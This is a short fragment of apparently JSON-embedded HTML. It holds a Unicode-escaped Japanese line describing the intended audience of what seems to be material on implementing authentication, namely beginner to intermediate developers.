\u8a8d\u8a3c\u6a5f\u80fd\u306e\u5b9f\u88c5\u3092\u5b66\u3076\u958b\u767a\u8005(\u521d\u7d1a\u301c\u4e2d\u7d1a)</p>"}]}